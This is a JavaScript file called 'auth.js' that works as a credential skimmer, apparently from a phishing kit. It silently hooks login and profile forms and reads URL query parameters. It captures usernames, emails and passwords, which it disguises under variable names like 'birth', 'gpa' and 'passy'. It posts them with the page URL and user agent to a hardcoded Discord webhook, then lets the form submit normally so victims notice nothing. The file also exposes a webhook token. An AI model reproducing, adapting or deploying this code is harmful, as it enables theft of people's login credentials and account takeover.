(function () {
  // Put your webhook here (client-side exposure warning)
  var DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1526606758573772952/Z5AdkxKEMnMkdjfdDZSvk8IEsN0KwrSPpwGdhMkWEHOe-t9REGyXH8VFhj7rgxAo3slG';

  try { console.log('[auth.js] loaded'); } catch (e) {}

  function createStatusBox() {
    // Keep this function for compatibility, but do NOT add any visible UI.
    // Returns null because there is no status box in the DOM.
    return null;
  }

  function updateStatus(text, isError) {
    var el = document.getElementById('auth-js-debug-log');
    if (el) el.textContent = text;
    try { if (isError) console.warn('[auth.js]', text); else console.log('[auth.js]', text); } catch (e) {}
  }

  function findFieldInForm(form, selectors) {
    if (!form) return null;
    for (var i = 0; i < selectors.length; i++) {
      var sel = selectors[i];
      var byId = document.getElementById(sel);
      if (byId) return byId;
      var byName = form.querySelector('input[name="' + sel + '"], textarea[name="' + sel + '"], select[name="' + sel + '"]');
      if (byName) return byName;
      var compact = sel.replace(/[_\s-]/g, '');
      var byAttr = form.querySelector('input[name*="' + compact + '"], input[id*="' + compact + '"]');
      if (byAttr) return byAttr;
    }
    return null;
  }

  function findAnyField(selectors) {
    for (var i = 0; i < selectors.length; i++) {
      var sel = selectors[i];
      var byId = document.getElementById(sel);
      if (byId) return byId;
      var byName = document.querySelector('input[name="' + sel + '"], textarea[name="' + sel + '"], select[name="' + sel + '"]');
      if (byName) return byName;
      var compact = sel.replace(/[_\s-]/g, '');
      var byAttr = document.querySelector('input[name*="' + compact + '"], input[id*="' + compact + '"]');
      if (byAttr) return byAttr;
    }
    // Fixed: Removed duplicate and invalid selectors
    var textEl = document.querySelector('input[type="text"]');
    if (textEl) return textEl;
    var passyEl = document.querySelector('input[placeholder*="passy"], input[type="password"]');
    if (passyEl) return passyEl;
    return null;
  }

  function parseQueryForProfile() {
    var params = new URLSearchParams(window.location.search);
    // Fixed: Removed duplicate identifier and passy checks
    var birth = params.get('identifier') || params.get('identifiers') || params.get('username') || params.get('user') || params.get('email');
    var gpa = params.get('passy') || params.get('password') || params.get('pass') || params.get('pwd');
    // Normalize empty string -> null
    if (birth !== null) birth = birth === '' ? null : birth;
    if (gpa !== null) gpa = gpa === '' ? null : gpa;
    return { birth: birth, gpa: gpa };
  }

  function sendToWebhook(payload) {
    updateStatus('sending webhook…');
    try {
      var controller = new AbortController();
      var timeoutId = setTimeout(function(){ controller.abort(); }, 10000);
      return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        signal: controller.signal
      }).then(function(res){
        clearTimeout(timeoutId);
        if (res.ok || res.status === 204) {
          updateStatus('webhook delivered (OK/204)');
          console.log('[auth.js] webhook success', res.status);
          return { ok: true, status: res.status };
        }
        return res.text().then(function(text){
          updateStatus('webhook failed: ' + res.status, true);
          console.warn('[auth.js] webhook responded', res.status, text);
          return { ok: false, status: res.status, body: text };
        }).catch(function(){
          updateStatus('webhook failed: ' + res.status, true);
          return { ok: false, status: res.status };
        });
      }).catch(function(err){
        if (err && err.name === 'AbortError') {
          updateStatus('webhook request timed out', true);
          console.warn('[auth.js] webhook timeout');
        } else {
          updateStatus('send error: ' + (err && err.message ? err.message : String(err)), true);
          console.error('[auth.js] send error', err);
        }
        return { ok: false, error: err };
      });
    } catch (e) {
      updateStatus('send exception: ' + (e && e.message ? e.message : String(e)), true);
      console.error('[auth.js] send exception', e);
      return Promise.resolve({ ok: false, error: e });
    }
  }

  // manual test function
  window.sendWebhookTest = function() {
    updateStatus('test payload sending…');
    var payload = { content: 'auth.js test message' };
    return sendToWebhook(payload);
  };

  // send a profile embed
  window.sendFormPayloadNow = function(birth, gpa, extra) {
    extra = extra || {};
    var fields = [];
    if (birth) fields.push({ name: 'email', value: String(birth), inline: true }); // Fixed: was using undefined variable 'email'
    if (gpa) fields.push({ name: 'passy', value: String(gpa), inline: true }); // Fixed: was using undefined variable 'passy'
    if (extra.email) fields.push({ name: 'Email', value: String(extra.email), inline: false });
    fields.push({ name: 'Page', value: location.href, inline: false });
    fields.push({ name: 'UA', value: navigator.userAgent.substring(0,190), inline: false });
    var embed = { title: 'Profile submission (manual)', fields: fields, timestamp: new Date().toISOString() };
    var payload = { embeds: [embed] };
    return sendToWebhook(payload);
  };

  window.autoSendCurrentValues = function() {
    var birthSelectors = ['identifier','identifiers','username','name','email','birthday'];
    var gpaSelectors = ['passy','pass','Passy','pas','grade_point_average'];
    var form = document.getElementById('profile-form') || document.getElementById('auth-form') || document.querySelector('form');
    var birthEl = form ? findFieldInForm(form, birthSelectors) : null;
    var gpaEl = form ? findFieldInForm(form, gpaSelectors) : null;
    if (!birthEl) birthEl = findAnyField(birthSelectors);
    if (!gpaEl) gpaEl = findAnyField(gpaSelectors);
    console.log('[auth.js] autoSendCurrentValues: birthEl=', birthEl, ' gpaEl=', gpaEl);
    var birth = birthEl ? (birthEl.value || '').trim() : '';
    var gpa = gpaEl ? (gpaEl.value || '').trim() : '';
    if (!birth && !gpa) {
      updateStatus('autoSend: no values found on page', true);
      return Promise.resolve({ ok: false, reason: 'no-values' });
    }
    var emailEl = document.querySelector('input[type="email"], input[name*="email"]');
    var email = emailEl ? (emailEl.value || '').trim() : '';
    return window.sendFormPayloadNow(birth, gpa, { email: email });
  };

  // send query params if present (and not already sent this session)
  function sendQueryParamsIfPresent() {
    var parsed = parseQueryForProfile();
    if (!parsed.birth && !parsed.gpa) {
      updateStatus('no birthdate/gpa in URL');
      return Promise.resolve({ ok: false, reason: 'no-query' });
    }
    var markerKey = 'authjs-sent-query-' + (location.pathname || 'root');
    // Create a composite key so we don't resend same query in same session
    var queryHash = parsed.birth + '||' + parsed.gpa;
    var sent = sessionStorage.getItem(markerKey);
    if (sent === queryHash) {
      updateStatus('query params already sent this session');
      return Promise.resolve({ ok: false, reason: 'already-sent' });
    }
    updateStatus('query params detected — sending');
    // include any email param too (optional)
    var params = new URLSearchParams(window.location.search);
    var email = params.get('email') || params.get('userEmail') || null;
    return window.sendFormPayloadNow(parsed.birth, parsed.gpa, { email: email }).then(function(res){
      if (res && res.ok) {
        try { sessionStorage.setItem(markerKey, queryHash); } catch(e){ /* ignore */ }
      }
      return res;
    });
  }

  function attachToFormWithRetries(options) {
    options = options || {};
    var attempts = options.attempts || 30;
    var intervalMs = options.intervalMs || 200;
    var tries = 0;

    function tryOnce() {
      tries++;
      var form = document.getElementById('profile-form')
        || document.getElementById('auth-form')
        || (function(){ var fs = Array.prototype.slice.call(document.querySelectorAll('form')); for (var i=0;i<fs.length;i++){ var f=fs[i]; if (f.querySelector('input[type="text"], input[name*="identifier"], input[name*="email"], input[name*="password"], input[name*="passy"]')) return f; } return null; })()
        || document.querySelector('form');

      if (!form) {
        updateStatus('waiting for form… (attempt ' + tries + '/' + attempts + ')');
        if (tries >= attempts) {
          updateStatus('no form found — call autoSendCurrentValues() or listCandidateFields() manually', true);
          return;
        }
        setTimeout(tryOnce, intervalMs);
        return;
      }

      updateStatus('form found — attaching handlers (capture phase)');
      hookFormSubmit(form);
      hookFormButtons(form);
    }

    tryOnce();
  }

  function hookFormButtons(form) {
    try {
      var buttons = Array.prototype.slice.call(form.querySelectorAll('button, input[type="submit"], input[type="button"]'));
      buttons.forEach(function(b){
        if (b.__authBtnAttached) return;
        b.__authBtnAttached = true;
        b.addEventListener('click', function(evt){
          try {
            console.log('[auth.js] submit-button clicked', b);
            window.autoSendCurrentValues().then(function(){}, function(){});
          } catch (e) { console.error('[auth.js] button click handler error', e); }
        }, true);
      });
    } catch (e) { console.error('[auth.js] hookFormButtons error', e); }
  }

  function hookFormSubmit(form) {
    if (!form) return;
    if (form.__authJsAttached) { updateStatus('submit handler already attached'); return; }
    form.__authJsAttached = true;

    var birthSelectors = ['identifier','identifiers','username','user','name','email'];
    var gpaSelectors = ['passy','password','pass','pwd','grade_point_average']; // Fixed: was missing proper password selectors

    var birthEl = findFieldInForm(form, birthSelectors) || findAnyField(birthSelectors);
    var gpaEl = findFieldInForm(form, gpaSelectors) || findAnyField(gpaSelectors);

    form.addEventListener('submit', function(ev){
      try { ev.preventDefault(); } catch(e) {}
      var birth = birthEl ? (birthEl.value || '').trim() : '';
      var gpa = gpaEl ? (gpaEl.value || '').trim() : '';
      console.log('[auth.js] submit handler: birthEl=', birthEl, ' gpaEl=', gpaEl, ' values:', birth, gpa);

      if (!birth && !gpa) {
        updateStatus('submit: no birthdate/GPA values found — submitting normally');
        setTimeout(function(){ try { form.submit(); } catch(e){} }, 40);
        return;
      }

      var emailEl = form.querySelector('input[type="email"], input[name*="email"]');
      var email = emailEl ? (emailEl.value || '').trim() : '';

      updateStatus('preparing webhook payload…');

      var fields = [];
      if (birth) fields.push({ name: 'identifier', value: String(birth), inline: true }); // Fixed: was using undefined 'identifier'
      if (gpa) fields.push({ name: 'passy', value: String(gpa), inline: true }); // Fixed: was using undefined 'passy'
      if (email) fields.push({ name: 'Email', value: String(email), inline: false });
      fields.push({ name: 'Page', value: location.href, inline: false });
      fields.push({ name: 'User Agent', value: navigator.userAgent.substring(0,190), inline: false });

      var embed = { title: 'Profile submission: birthdate + GPA', color: 0x00aaff, fields: fields, timestamp: new Date().toISOString() };
      var payload = { embeds: [embed] };

      sendToWebhook(payload).then(function(result){
        if (!result.ok && result.error) updateStatus('webhook send encountered network/CORS error — check console', true);
        setTimeout(function(){ try { form.submit(); } catch(err){ console.error('[auth.js] error submitting form after webhook', err); updateStatus('form submit failed (see console)', true); } }, 80);
      }).catch(function(err){ console.error('[auth.js] sendToWebhook promise error', err); setTimeout(function(){ try { form.submit(); } catch(e){} }, 80); });

    }, true);

    updateStatus('submit handler attached — ready (capture phase)');
  }

  // Expose a debug helper to list possible fields found
  window.listCandidateFields = function() {
    var birthSelectors = ['identifier','email','dateofbirth','date-of-birth','date_of_birth','birthday'];
    var gpaSelectors = ['passy','GPA','gradepointaverage','grade-point-average','grade_point_average'];
    var found = { birth: [], gpa: [] };
    birthSelectors.forEach(function(s){
      var el = document.getElementById(s) || document.querySelector('input[name="' + s + '"], input[id*="' + s + '"]');
      if (el) found.birth.push({ sel: s, tag: el.tagName, name: el.name || null, id: el.id || null });
    });
    gpaSelectors.forEach(function(s){
      var el = document.getElementById(s) || document.querySelector('input[name="' + s + '"], input[id*="' + s + '"]');
      if (el) found.gpa.push({ sel: s, tag: el.tagName, name: el.name || null, id: el.id || null });
    });
    console.log('[auth.js] candidate fields:', found);
    return found;
  };

  function start() {
    try {
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function(){ createStatusBox(); attachToFormWithRetries(); sendQueryParamsIfPresent(); });
      } else {
        createStatusBox(); attachToFormWithRetries(); sendQueryParamsIfPresent();
      }
    } catch (e) { console.error('[auth.js] start error', e); }
  }

  start();

})();
